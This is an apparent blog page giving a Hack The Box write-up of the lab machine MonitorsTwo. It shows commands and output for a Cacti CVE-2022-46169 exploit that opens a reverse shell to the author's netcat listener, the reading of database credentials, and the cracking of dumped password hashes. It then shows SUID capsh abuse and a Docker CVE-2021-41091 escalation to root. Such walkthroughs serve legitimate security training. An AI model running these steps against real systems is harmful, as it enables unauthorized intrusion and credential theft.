@@ -1,0 +1,158 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self' https://www.dropbox.com https://*.dl.dropboxusercontent.com https://photos.app.goo.gl https://drive.google.com https://photos.google.com https://video-downloads.googleusercontent.com https://*.googleusercontent.com https://*.googlevideo.com https://youtube.googleapis.com; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self' https://w.soundcloud.com https://www.youtube.com https://www.youtube-nocookie.com https://www.dropbox.com http://localhost https://www.dropbox.com http://darvein.local https://disqus.com; img-src 'self' https://photos.google.com https://lh3.googleusercontent.com https://www.dropbox.com https://*.dl.dropboxusercontent.com https://*.disqus.com https://c.disquscdn.com; object-src https://lh3.googleusercontent.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/ https://c.disquscdn.com; script-src 'self' 'unsafe-inline' https://www.google-analytics.com https://cdnjs.cloudflare.com https://www.googletagmanager.com https://www.dropbox.com http://localhost http://darvein.local https://drv21.disqus.com https://c.disquscdn.com; prefetch-src 'self' https://youtube.googleapis.com; connect-src 'self' https://www.google-analytics.com https://links.services.disqus.com;"><meta name=author content="Dennis Ruiz"><meta name=description content="easy - MonitorsTwo (machine) User Flag I wanted to write this down in spanish but I&rsquo;m not that used to switch my keyboard layout between english and spanish in vim, so&mldr;
+➤ curl -s http://monitorstwo/ | elinks --dump User Login Enter your Username and Password below Username [1]_____________________ Password [2]_____________________ [3][ ] Keep me signed in [4][ Login ] Version 1.2.22 | (c) 2004-2023 - The Cacti Group So I remember this Cacti monitoring tool."><meta name=keywords content="blog,developer,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content><meta name=twitter:description content="easy - MonitorsTwo (machine) User Flag I wanted to write this down in spanish but I&rsquo;m not that used to switch my keyboard layout between english and spanish in vim, so&mldr;
+➤ curl -s http://monitorstwo/ | elinks --dump User Login Enter your Username and Password below Username [1]_____________________ Password [2]_____________________ [3][ ] Keep me signed in [4][ Login ] Version 1.2.22 | (c) 2004-2023 - The Cacti Group So I remember this Cacti monitoring tool."><meta property="og:title" content><meta property="og:description" content="easy - MonitorsTwo (machine) User Flag I wanted to write this down in spanish but I&rsquo;m not that used to switch my keyboard layout between english and spanish in vim, so&mldr;
+➤ curl -s http://monitorstwo/ | elinks --dump User Login Enter your Username and Password below Username [1]_____________________ Password [2]_____________________ [3][ ] Keep me signed in [4][ Login ] Version 1.2.22 | (c) 2004-2023 - The Cacti Group So I remember this Cacti monitoring tool."><meta property="og:type" content="article"><meta property="og:url" content="https://www.darvein.net/infosec/htb/machines/easy/monitorstwo/"><meta property="article:section" content="infosec"><title>easy - MonitorsTwo (machine) </title><link rel=canonical href=https://www.darvein.net/infosec/htb/machines/easy/monitorstwo/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.a1a7e7e7bd8b6629931805334fd6cf056ee6f154702847e6d597bbfe80446a0d.css integrity="sha256-oafn572LZimTGAUzT9bPBW7m8VRwKEfm1Ze7/oBEag0=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.39e41a7f16bdf8cb16e43cae7d714fa1016f1d2d2898a5b3f27f42c9979204e2.css integrity="sha256-OeQafxa9+MsW5DyufXFPoQFvHS0omKWz8n9CyZeSBOI=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/custom.min.7cf8a329bb485491ed5be45bd286916c655bf66e11e3fe4d82649437eae8b51b.css integrity="sha256-fPijKbtIVJHtW+Rb0oaRbGVb9m4R4/5NgmSUN+rotRs=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5><meta name=generator content="Hugo 0.120.4"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Darvein
+</a><input type=checkbox id=menu-toggle>
+<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/infosec/>Infosec</a></li><li class=navigation-item><a class=navigation-link href=/coding/>Coding</a></li><li class=navigation-item><a class=navigation-link href=/devops/>Devops</a></li></ul></section></nav><div class=content><section class="container page"><article><h1 id=easy---monitorstwo-machine>easy - MonitorsTwo (machine)
+<a class=heading-link href=#easy---monitorstwo-machine><i class="fa fa-link" aria-hidden=true></i></a></h1><h2 id=user-flag>User Flag
+<a class=heading-link href=#user-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><p>I wanted to write this down in spanish but I&rsquo;m not that used to switch my keyboard layout between english and spanish in vim, so&mldr;</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>➤ curl -s http://monitorstwo/ | elinks --dump
+</span></span><span style=display:flex><span>   User Login
+</span></span><span style=display:flex><span>   Enter your Username and Password below
+</span></span><span style=display:flex><span>   Username [1]_____________________
+</span></span><span style=display:flex><span>   Password [2]_____________________
+</span></span><span style=display:flex><span>   [3][ ] Keep me signed in
+</span></span><span style=display:flex><span>   [4][ Login ]
+</span></span><span style=display:flex><span>   Version 1.2.22 | (c) 2004-2023 - The Cacti Group
+</span></span></code></pre></div><p>So I remember this Cacti monitoring tool. Its getting interesting and nostalgic.</p><p>Scanning ports:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>➤ sudo nmap -nv -Pn -sC -sV -O -T4 -oA nmap-scan monitorstwo
+</span></span><span style=display:flex><span>[sudo] password <span style=color:#fb660a;font-weight:700>for</span> n0kt:
+</span></span><span style=display:flex><span>sudo: nmap: command not found
+</span></span></code></pre></div><p>Ok, I know I know, its been hard days.</p><p>I forgot some parameters purposes:</p><ul><li>-n/-R: Never do DNS resolution/Always resolve [default: sometimes]</li><li>-v: Increase verbosity level (use -vv or more for greater effect)</li><li>-Pn: Treat all hosts as online &ndash; skip host discovery</li><li>-sV: Probe open ports to determine service/version info</li><li>-sC: equivalent to &ndash;script=default</li><li>-O: Enable OS detection</li><li>-T4 for faster execution; and then the hostname.</li></ul><p>By the way, these ports are open:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>➤ cat nmap-scan.nmap | ag open
+</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+</span></span><span style=display:flex><span>80/tcp open  http    nginx 1.18.0 (Ubuntu)
+</span></span></code></pre></div><p>So we are using cacti v 1.2.22</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>➤ curl -s http://monitorstwo | ag version
+</span></span><span style=display:flex><span>                &lt;div <span style=color:#fb660a>class</span>=<span style=color:#0086d2>&#39;versionInfo&#39;</span>&gt;Version 1.2.22 | (c) 2004-2023 - The Cacti Group&lt;/div&gt;
+</span></span></code></pre></div><p>A quick googlefu says this CVE-2022-46169 is related. So I&rsquo;ve found couple of exploits, one github repo that was recently created (strange, maybe the machine author?) and one from the classic exploit-db:</p><ul><li><a href=https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22>https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22</a></li><li><a href=https://www.exploit-db.com/exploits/51166>https://www.exploit-db.com/exploits/51166</a></li></ul><p>Both exloits are the same, just written in a different way, both injects a payload on file <code>remote_agent.php</code> on parameter <code>poller_id</code>.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># Attacker</span>
+</span></span><span style=display:flex><span>➤ python3 51166.py -u http://monitorstwo --LHOST=10.10.14.3 --LPORT=<span style=color:#0086f7;font-weight:700>55555</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>➤ nc -lvnp <span style=color:#0086f7;font-weight:700>55555</span>
+</span></span><span style=display:flex><span>Connection from 10.10.11.211:51492
+</span></span><span style=display:flex><span>bash: cannot set terminal process group (1): Inappropriate ioctl <span style=color:#fb660a;font-weight:700>for</span> device
+</span></span><span style=display:flex><span>bash: no job control in this shell
+</span></span><span style=display:flex><span>www-data@50bca5e748b0:/var/www/html$ id
+</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=33(www-data) <span style=color:#fb660a>gid</span>=33(www-data) <span style=color:#fb660a>groups</span>=33(www-data)
+</span></span></code></pre></div><p>Looking for something useful:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># DB Creds!</span>
+</span></span><span style=display:flex><span>$ grep -Ri database_ include/config.php
+</span></span><span style=display:flex><span>grep -Ri database_ include/config.php
+</span></span><span style=display:flex><span><span style=color:#fb660a>$database_type</span>     = <span style=color:#0086d2>&#39;mysql&#39;</span>;
+</span></span><span style=display:flex><span><span style=color:#fb660a>$database_default</span>  = <span style=color:#0086d2>&#39;cacti&#39;</span>;
+</span></span><span style=display:flex><span><span style=color:#fb660a>$database_hostname</span> = <span style=color:#0086d2>&#39;db&#39;</span>;
+</span></span><span style=display:flex><span><span style=color:#fb660a>$database_username</span> = <span style=color:#0086d2>&#39;root&#39;</span>;
+</span></span><span style=display:flex><span><span style=color:#fb660a>$database_password</span> = <span style=color:#0086d2>&#39;root&#39;</span>;
+</span></span><span style=display:flex><span><span style=color:#fb660a>$database_port</span>     = <span style=color:#0086d2>&#39;3306&#39;</span>;
+</span></span><span style=display:flex><span><span style=color:#fb660a>$database_retries</span>  = 5;
+</span></span><span style=display:flex><span><span style=color:#fb660a>$database_ssl</span>      = false;
+</span></span><span style=display:flex><span><span style=color:#fb660a>$database_ssl_key</span>  = <span style=color:#0086d2>&#39;&#39;</span>;
+</span></span><span style=display:flex><span><span style=color:#fb660a>$database_ssl_cert</span> = <span style=color:#0086d2>&#39;&#39;</span>;
+</span></span><span style=display:flex><span><span style=color:#fb660a>$database_ssl_ca</span>   = <span style=color:#0086d2>&#39;&#39;</span>;
+</span></span><span style=display:flex><span><span style=color:#fb660a>$database_persist</span>  = false;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$ mysql --version
+</span></span><span style=display:flex><span>mysql --version
+</span></span><span style=display:flex><span>mysql  Ver 15.1 Distrib 10.5.15-MariaDB, <span style=color:#fb660a;font-weight:700>for</span> debian-linux-gnu (x86_64) using  EditLine wrapper
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># Worked!</span>
+</span></span><span style=display:flex><span>$ mysql -h db -u root -p -e <span style=color:#0086d2>&#34;show databases;&#34;</span>
+</span></span><span style=display:flex><span>&lt;w/html$ mysql -h db -u root -p -e <span style=color:#0086d2>&#34;show databases;&#34;</span>
+</span></span><span style=display:flex><span>Enter password: root
+</span></span><span style=display:flex><span>Database
+</span></span><span style=display:flex><span>information_schema
+</span></span><span style=display:flex><span>cacti
+</span></span><span style=display:flex><span>mysql
+</span></span><span style=display:flex><span>performance_schema
+</span></span><span style=display:flex><span>sys
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># Got this, now I just need to crack those hases</span>
+</span></span><span style=display:flex><span>$ mysql -h db -u root -p -e <span style=color:#0086d2>&#34;use cacti; select username, password, email_address from user_auth;&#34;</span>
+</span></span><span style=display:flex><span>&lt; username, password, email_address from user_auth;<span style=color:#0086d2>&#34;
+</span></span></span><span style=display:flex><span><span style=color:#0086d2>Enter password: root
+</span></span></span><span style=display:flex><span><span style=color:#0086d2>username        password        email_address
+</span></span></span><span style=display:flex><span><span style=color:#0086d2>admin   </span><span style=color:#fb660a>$2</span><span style=color:#0086d2>y</span><span style=color:#fb660a>$10$IhEA</span><span style=color:#0086d2>.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC    admin@monitorstwo.htb
+</span></span></span><span style=display:flex><span><span style=color:#0086d2>guest   43e9a4ab75570f5b
+</span></span></span><span style=display:flex><span><span style=color:#0086d2>marcus  </span><span style=color:#fb660a>$2</span><span style=color:#0086d2>y</span><span style=color:#fb660a>$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1</span><span style=color:#0086d2>.3WeKlBn70JonsdW/MhFYK4C    marcus@monitorstwo.htb
+</span></span></span></code></pre></div><p>So I left my friend <code>john</code> working, the passwsord it got was not for Cacti but for marcus ssh connection.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>➤ john -w=/usr/share/dict/rockyou.txt hashes.txt
+</span></span><span style=display:flex><span>Warning: detected hash type <span style=color:#0086d2>&#34;bcrypt&#34;</span>, but the string is also recognized as <span style=color:#0086d2>&#34;bcrypt-opencl&#34;</span>
+</span></span><span style=display:flex><span>Use the <span style=color:#0086d2>&#34;--format=bcrypt-opencl&#34;</span> option to force loading these as that type instead
+</span></span><span style=display:flex><span>Loaded <span style=color:#0086f7;font-weight:700>2</span> password hashes with <span style=color:#0086f7;font-weight:700>2</span> different salts (bcrypt [Blowfish 32/64 X3])
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>funkymonkey      (?)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>marcus@monitorstwo:~$ id
+</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1000(marcus) <span style=color:#fb660a>gid</span>=1000(marcus) <span style=color:#fb660a>groups</span>=1000(marcus)
+</span></span><span style=display:flex><span>marcus@monitorstwo:~$ ls
+</span></span><span style=display:flex><span>user.txt
+</span></span></code></pre></div><h2 id=root-flag>Root Flag
+<a class=heading-link href=#root-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><p>So marcus doesn&rsquo;t have sudo privs, there is no cronjobs for the user. But I&rsquo;ve found something in the system processes:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>marcus@monitorstwo:~$ ps aux | vim -
+</span></span><span style=display:flex><span>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+</span></span><span style=display:flex><span>root         <span style=color:#0086f7;font-weight:700>900</span>  0.0  2.1 <span style=color:#0086f7;font-weight:700>1455488</span> <span style=color:#0086f7;font-weight:700>85572</span> ?       Ssl  Jun07   0:04 /usr/sbin/dockerd -H fd://
+</span></span><span style=display:flex><span>root         <span style=color:#0086f7;font-weight:700>905</span>  0.0  0.0   <span style=color:#0086f7;font-weight:700>6816</span>  <span style=color:#0086f7;font-weight:700>2928</span> ?        Ss   Jun07   0:00 /usr/sbin/cron -f
+</span></span><span style=display:flex><span>root         <span style=color:#0086f7;font-weight:700>909</span>  0.3  0.8 <span style=color:#0086f7;font-weight:700>1410928</span> <span style=color:#0086f7;font-weight:700>34616</span> ?       Ssl  Jun07   0:29 /usr/bin/containerd
+</span></span><span style=display:flex><span>root         <span style=color:#0086f7;font-weight:700>924</span>  0.0  0.0  <span style=color:#0086f7;font-weight:700>51212</span>  <span style=color:#0086f7;font-weight:700>1496</span> ?        Ss   Jun07   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
+</span></span><span style=display:flex><span>www-data     <span style=color:#0086f7;font-weight:700>925</span>  0.0  0.1  <span style=color:#0086f7;font-weight:700>51776</span>  <span style=color:#0086f7;font-weight:700>5264</span> ?        S    Jun07   0:00 nginx: worker process
+</span></span><span style=display:flex><span>www-data     <span style=color:#0086f7;font-weight:700>926</span>  0.0  0.1  <span style=color:#0086f7;font-weight:700>51908</span>  <span style=color:#0086f7;font-weight:700>6044</span> ?        S    Jun07   0:00 nginx: worker process
+</span></span><span style=display:flex><span>root        <span style=color:#0086f7;font-weight:700>1231</span>  0.0  0.2 <span style=color:#0086f7;font-weight:700>1452188</span> <span style=color:#0086f7;font-weight:700>10896</span> ?       Sl   Jun07   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id e2378324fced58e8166b82ec842ae45961417b4195aade5113fdc9c6397edc69 -address /run/containerd/containerd.sock
+</span></span><span style=display:flex><span>root        <span style=color:#0086f7;font-weight:700>1332</span>  0.0  0.0 <span style=color:#0086f7;font-weight:700>1223816</span> <span style=color:#0086f7;font-weight:700>3096</span> ?        Sl   Jun07   0:00 /usr/sbin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port <span style=color:#0086f7;font-weight:700>8080</span> -container-ip 172.19.0.3 -container-port <span style=color:#0086f7;font-weight:700>80</span>
+</span></span><span style=display:flex><span>root        <span style=color:#0086f7;font-weight:700>1347</span>  0.0  0.2 <span style=color:#0086f7;font-weight:700>1527072</span> <span style=color:#0086f7;font-weight:700>10152</span> ?       Sl   Jun07   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e -address /run/containerd/containerd.sock
+</span></span><span style=display:flex><span>systemd+    <span style=color:#0086f7;font-weight:700>1602</span>  0.0  0.3  <span style=color:#0086f7;font-weight:700>24576</span> <span style=color:#0086f7;font-weight:700>12164</span> ?        Ss   Jun07   0:01 /lib/systemd/systemd-resolved
+</span></span><span style=display:flex><span>root        <span style=color:#0086f7;font-weight:700>1829</span>  0.0  0.7 <span style=color:#0086f7;font-weight:700>384860</span> <span style=color:#0086f7;font-weight:700>29316</span> ?        Ssl  00:22   0:00 /usr/libexec/fwupd/fwupd
+</span></span><span style=display:flex><span>root        <span style=color:#0086f7;font-weight:700>1834</span>  0.0  0.2 <span style=color:#0086f7;font-weight:700>241192</span>  <span style=color:#0086f7;font-weight:700>9604</span> ?        Ssl  00:22   0:00 /usr/lib/upower/upowerd
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$ containerd --version
+</span></span><span style=display:flex><span>containerd github.com/containerd/containerd 1.4.5~ds1 1.4.5~ds1-2+deb11u1
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$ docker -v
+</span></span><span style=display:flex><span>Docker version 20.10.5+dfsg1, build 55c4c88
+</span></span></code></pre></div><p>Also, notice that nginx process running, wasn&rsquo;t it apache2?</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ grep -R server_name /etc/nginx/*
+</span></span><span style=display:flex><span>/etc/nginx/sites-available/default:     server_name cacti.monitorstwo.htb;
+</span></span><span style=display:flex><span>/etc/nginx/sites-enabled/default:       server_name cacti.monitorstwo.htb;
+</span></span></code></pre></div><p>I got it, apache2 is running inside a container where Cacti is hosted and via docker-proxy it is being exposed from port 8080 to port 80 via Nginx.</p><p>So I&rsquo;ve noticed those containerd and docker versions:</p><ul><li>Containerd 1.4.5 has CVE-2021-41103</li><li>Docker 20.10.5 has CVE-2021-41091 (
+<a href=https://docs.docker.com/engine/release-notes/20.10/>https://docs.docker.com/engine/release-notes/20.10/</a>
+)</li></ul><p>The docker one is interesting, an attacker can manipulate base system files (/var/lib/docker) from within a container via SUID.</p><p>So let&rsquo;s connect back to the cacti container using the cacti remote shell vuln we saw before.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># Search for a SUID bin file</span>
+</span></span><span style=display:flex><span>www-data@50bca5e748b0:/var/www/html$ find / -perm -u=s -type f 2&gt;/dev/null
+</span></span><span style=display:flex><span>/usr/bin/gpasswd
+</span></span><span style=display:flex><span>/usr/bin/passwd
+</span></span><span style=display:flex><span>/usr/bin/chsh
+</span></span><span style=display:flex><span>/usr/bin/chfn
+</span></span><span style=display:flex><span>/usr/bin/newgrp
+</span></span><span style=display:flex><span>/sbin/capsh
+</span></span><span style=display:flex><span>/bin/mount
+</span></span><span style=display:flex><span>/bin/umount
+</span></span><span style=display:flex><span>/bin/su
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>www-data@50bca5e748b0:/var/www/html$ capsh --gid=<span style=color:#0086f7;font-weight:700>0</span> --uid=<span style=color:#0086f7;font-weight:700>0</span> --
+</span></span><span style=display:flex><span>id
+</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=0(root) <span style=color:#fb660a>gid</span>=0(root) <span style=color:#fb660a>groups</span>=0(root),33(www-data)
+</span></span><span style=display:flex><span>chmod u+s /bin/bash
+</span></span></code></pre></div><p>And now from marcus ssh connection:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>marcus@monitorstwo:~$ ./exploit.sh
+</span></span><span style=display:flex><span>[!] Vulnerable to CVE-2021-41091
+</span></span><span style=display:flex><span>[!] Now connect to your Docker container that is accessible and obtain root access !
+</span></span><span style=display:flex><span>[&gt;] After gaining root access execute this command (chmod u+s /bin/bash)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
+</span></span><span style=display:flex><span>[!] Available Overlay2 Filesystems:
+</span></span><span style=display:flex><span>/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
+</span></span><span style=display:flex><span>/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>[!] Iterating over the available Overlay2 filesystems !
+</span></span><span style=display:flex><span>[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
+</span></span><span style=display:flex><span>[x] Could not get root access in <span style=color:#0086d2>&#39;/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+</span></span><span style=display:flex><span>[!] Rooted !
+</span></span><span style=display:flex><span>[&gt;] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+</span></span><span style=display:flex><span>[?] If it didn<span style=color:#0086d2>&#39;t spawn a shell go to this path and execute &#39;</span>./bin/bash -p&#39;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>[!] Spawning Shell
+</span></span><span style=display:flex><span>bash-5.1# exit
+</span></span></code></pre></div><p>And voilá:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>marcus@monitorstwo:~$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p
+</span></span><span style=display:flex><span>bash-5.1# id
+</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1000(marcus) <span style=color:#fb660a>gid</span>=1000(marcus) <span style=color:#fb660a>euid</span>=0(root) <span style=color:#fb660a>groups</span>=1000(marcus)
+</span></span><span style=display:flex><span>bash-5.1# ls /root
+</span></span><span style=display:flex><span>cacti  root.txt
+</span></span></code></pre></div></article></section></div><footer class=footer><section class=container>©
+2021 -
+2024
+Dennis Ruiz
+·
+Powered by <a href=https://gohugo.io/>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/>Coder</a>.</section></footer></main><script src=/js/coder.min.236049395dc3682fb2719640872958e12f1f24067bb09c327b233e6290c7edac.js integrity="sha256-I2BJOV3DaC+ycZZAhylY4S8fJAZ7sJwyeyM+YpDH7aw="></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-6CQZY8W0WD"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-6CQZY8W0WD")</script><script>$(document).on("input propertychange paste change",".FilterSearch",function(){var n=$(this).val().toLowerCase(),s=$(this).closest("ul"),t=s.find("li:gt(0)");t.hide(),t.filter(function(){var e=$(this).text().toLowerCase();return e.indexOf(n)>=0}).show()})</script></body></html>
